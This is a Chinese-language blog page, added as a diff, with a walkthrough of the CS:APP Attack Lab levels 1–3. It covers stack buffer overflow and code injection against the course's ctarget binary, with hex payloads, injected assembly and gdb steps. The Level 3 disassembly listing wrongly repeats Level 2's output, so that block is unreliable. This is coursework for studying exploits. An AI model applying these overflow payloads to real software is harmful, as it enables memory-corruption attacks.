@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>CSapp Attack实验 | 狼哥LOL</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="缓冲区溢出攻击">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CSapp Attack实验">
+<meta property="og:url" content="http://example.com/2022/05/19/attacklab/index.html">
+<meta property="og:site_name" content="狼哥LOL">
+<meta property="og:description" content="缓冲区溢出攻击">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s2.loli.net/2022/05/21/rBJqPgzEhRWMbdy.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/21/NGcy2bIxFmrh4BV.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/21/PpLc7jaXCivN3Sy.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/22/vFGRyHzme421hIi.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/22/Klv69uwJnWCzPtN.png">
+<meta property="article:published_time" content="2022-05-19T06:54:13.106Z">
+<meta property="article:modified_time" content="2022-11-13T08:17:30.542Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2022/05/21/rBJqPgzEhRWMbdy.png">
+  
+    <link rel="alternate" href="/atom.xml" title="狼哥LOL" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">狼哥LOL</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">666</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-attacklab" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/05/19/attacklab/" class="article-date">
+  <time class="dt-published" datetime="2022-05-19T06:54:13.106Z" itemprop="datePublished">2022-05-19</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      CSapp Attack实验
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="csapp-Attack实验"><a href="#csapp-Attack实验" class="headerlink" title="csapp Attack实验"></a>csapp Attack实验</h1><p>本次实验依然是在Linux上实现，主要涉及两种攻击方式：code injection 代码注入攻击和Return-oriented programming（ROP）面相返回编程。</p>
+<p>实验前三个level主要是对文件ctarget进行攻击，其中会用到hex2raw辅助工具来生成攻击字符串，实验前一定要看一下实验介绍writeup。</p>
+<p>##第一部分<br>主要是代码注入攻击，执行ctarget文件的test函数，任务是通过修改返回地址，使执行完<br>getbuf函数后返回到其他函数，而不是返回test</p>
+<p>####level 1：</p>
+<p>这关不需要注入代码，只要修改getbuf函数的返回值返回到touch1即可。<br>首先我们用objdump 命令反编译ctarget文件重定向到一个文本文件里</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d ctarget &gt;level1</span><br></pre></td></tr></table></figure>
+<p>然后用vim打开level1，用&#x2F;getbuf查找到getbuf的汇编代码：<br>![YW8U__L8IJAK29EM8_5AJ&#96;Y.png](<a target="_blank" rel="noopener" href="https://s2.loli.net/2022/05/19/ktowqAOeMu79BpG.png">https://s2.loli.net/2022/05/19/ktowqAOeMu79BpG.png</a>)<br>可以看到getbuf申请了40个字节的空间，因此我们要覆盖的返回地址是从第41个字节开始<br>然后我们在查找touch1文件，得到第一行的地址为4017c0，这就是我们要返回的地址，ret指令获得的是8个字节的地址，因此我们需要输入48个字节，前40个随便输入，最后八位是修改后的返回地址，注意这里是小端序，这里我们创建一个文本文件ans.txt，把要输入的攻击字符串写出来：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">c0 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+<p>然后我们用hex2raw来生成攻击字符串ansx.txt：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./hex2raw &lt; ans.txt &gt; ansx.txt</span><br></pre></td></tr></table></figure>
+<p>然后我们执行ctarget文件ansx.txt作为输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ctarget -qi ansx.txt</span><br></pre></td></tr></table></figure>
+<p>即可完成实验。</p>
+<p>###Level2</p>
+<p>第二关要求我们注入一些代码，大致任务是，让test返回到touch2函数，并且向%rdi传入一个cookie值作为参数传入touch2使其输出正确的内容</p>
+<p>经过分析，我们把任务分为这几个步骤<br>####1.用gdb找到getbuf的rsp栈顶指针<br>我们gdb ctarget进入调试，然后在getbuf函数设置断点，在运行，并si执行进入getbuf，disas getbuf查看是否执行到分配完空间，再print $rsp 得到栈顶地址，如下图：<br><img src="https://s2.loli.net/2022/05/21/rBJqPgzEhRWMbdy.png" alt="FIA@C_7HRW_U__7_LMK_4FP.png"></p>
+<p>####2.找到touch2的首地址</p>
+<p>我们用vim打开在之前重定向的ctarget程序源码文本level1<br>然后输入&#x2F;touch2 找到touch2首地址：<br><img src="https://s2.loli.net/2022/05/21/NGcy2bIxFmrh4BV.png" alt="94QK_KDUT_4H_9X0H~_9KM6.png"></p>
+<p>####3.查看cookie的值<br>这个值直接在当前目录下已经给我们了，只要cat cookie.txt 即可</p>
+<p>####4.编写攻击汇编代码<br>这里的一些方法可以参考writeup的附录B<br>我们先创建一个l2.s<br>这里我们只需要把cookie值传给%rdi，然后返回touch2，所以汇编指令为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq $0x59b997fa,%rdi    #cookie传入rdi</span><br><span class="line">pushq $0x4017ec          #把touch2首地址压入栈</span><br><span class="line">retq                     #返回</span><br></pre></td></tr></table></figure>
+
+<p>####4.得到攻击代码的16进制编码<br>根据附录B的指示<br>我们进行如下操作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c l2.s  #编译我们写的代码</span><br><span class="line">objdump -d l2.o &gt;l2.d  #反编译代码</span><br></pre></td></tr></table></figure>
+<p>然后我们 cat 查看l2.d</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/attc/target1]</span><br><span class="line">└─$ cat lcc2.d</span><br><span class="line"></span><br><span class="line">lcc2.o：     文件格式 elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi</span><br><span class="line">   7:   68 ec 17 40 00          push   $0x4017ec</span><br><span class="line">   c:   c3                      ret</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>指令前面的16进制编码就是我们需要的字节编码。</p>
+<p>####5.编写攻击代码<br>这里我们需要先把刚才生成的指令字节编码输入，然后填充到40字节，最后把rsp的地址输入作为getbuf的返回地址（注意最后的返回地址是小端序存储，并且要补齐八个字节）<br>所以我们创建ans2.txt而输入的代码是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 68 </span><br><span class="line">ec 17 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
+
+<p>####6.调用运行<br>最后我们生成攻击代码并运行ctarget</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./hex2raw &lt; ans2.txt &gt; ans2x.txt</span><br><span class="line">./ctarget -qi ans2x.txt</span><br></pre></td></tr></table></figure>
+<p>得到结果：<br><img src="https://s2.loli.net/2022/05/21/PpLc7jaXCivN3Sy.png" alt="__0KW9~6Y_B__IN2SG5Y@SW.png"><br>可以看到第二行是touch2！证明我们正确运行了。</p>
+<p>###Level3</p>
+<p>第三部分任务是让给我们执行touch3函数，也需要把cookie值传入%rdi寄存器作为参数传给touch3，与上一关不同的是，这次我们要传的是cookie的字符串格式，而且不能直接传给%rdi<br>而是把存字符串的地址传给他，所以我们要把cookie转换成16进制的ASCII码并且存到一个位置，后边的提示告诉我们，由于touch3中存在hexmatch和strncmp函数，会分配空间覆盖getbuf的空间，所以我们不能把字符串存在getbuf栈帧内，我们可以存到test函数的栈帧中，因为他不会受到影响。<br>touch3里的hexmatch函数主要是比较我们传入的字符串与cookie是否相同。<br>那么第三关就可以分为以下几个步骤</p>
+<p>####1.把cookie值转换成ascll 16进制码</p>
+<p>查看cookie文件得到cookie为0x59b997fa<br>根据提示信息，我们用man ASCII 查看ASCII码表得到cookie的ascill码 为<br>35 39 62 39 39 37 66 61 00（字符串后边要加&#x2F;0）</p>
+<p>####2.找到test的栈顶指针<br>我们用gdb ctarget调试该程序<br>然后在test设置断点，run -q 运行，<br>ni单步执行到test分配完空间<br>print $rsp查看栈顶指针，得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) print $rsp</span><br><span class="line">$2 = (void *) 0x5561dca8</span><br></pre></td></tr></table></figure>
+<p>这就是我们要存字符串的地址</p>
+<p>####3.找到getbuf的栈顶指针<br>同样的，gdb ctarget进入gdb界面<br>b getbuf 设置断点<br>run -q运行<br>ni单步执行到getbuf分配完空间<br>print $rsp 查看栈顶指针</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) print $rsp</span><br><span class="line">$5 = (void *) 0x5561dc78</span><br></pre></td></tr></table></figure>
+<p>这是我们要修改成的getbuf返回地址</p>
+<p>####4.找到touch3的首地址<br>我们用vim打开反编译ctarget的level1文件<br>输入&#x2F;touch3找到touch3的首地址为0x4018fa，如图：<br><img src="https://s2.loli.net/2022/05/22/vFGRyHzme421hIi.png" alt="@CLEF_0E__RG9EFOZE_1FN9.png"></p>
+<p>####5.编写注入汇编代码<br>我们vim打开一个新文件l3.s<br>这里我们要实现的是把cookie字符串所在地址传给%rdi，然后返回到touch3，所以汇编代码是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq $0x5561dca8,%rdi</span><br><span class="line">pushq $0x4018fa</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>
+<p>然后我们gcc -c l3.s 进行编译<br>如果不报错，就objdump -d l3.o &gt; l3.d 反编译<br>然后cat l3.d查看汇编指令的16进制字节编码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/attc/target1]</span><br><span class="line">└─$ cat lcc2.d</span><br><span class="line"></span><br><span class="line">lcc2.o：     文件格式 elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi</span><br><span class="line">   7:   68 ec 17 40 00          push   $0x4017ec</span><br><span class="line">   c:   c3                      ret</span><br></pre></td></tr></table></figure>
+
+<p>####6.编写攻击代码并运行<br>我们先输入注入攻击的代码，然后补充到40字节，在吧之前得到的getbuf栈顶指针覆盖到getbuf的返回地址，然后补充到八字节，在吧字符串的ascill码输入，所以攻击代码为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55 68  #攻击指令</span><br><span class="line">fa 18 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00  #返回到攻击指令</span><br><span class="line">35 39 62 39 39 37 66 61  #字符串</span><br><span class="line">00</span><br></pre></td></tr></table></figure>
+<p>保存到ans3.txt最后输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./hex2raw &lt; ans3.txt &gt; ans3x.txt</span><br></pre></td></tr></table></figure>
+<p>得到攻击字符，最后运行ctarget<br>如果运行成功，即可得到如下画面：<br><img src="https://s2.loli.net/2022/05/22/Klv69uwJnWCzPtN.png" alt="__0KW9~6Y_B__IN2SG5Y@SW.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/05/19/attacklab/" data-id="claf34ytk0000s4u6eccogors" data-title="CSapp Attack实验" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2022/05/12/bomblab/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">May 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">March 2022</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/05/19/attacklab/">CSapp Attack实验</a>
+          </li>
+        
+          <li>
+            <a href="/2022/05/12/bomblab/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2022/03/19/Linux%E5%AE%9E%E9%AA%8C%E4%B8%80/">邪恶先生闯关实验</a>
+          </li>
+        
+          <li>
+            <a href="/2022/03/19/sekiro/sekiro/">只狼</a>
+          </li>
+        
+          <li>
+            <a href="/2022/03/06/hello-world/">Hello World</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2022 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
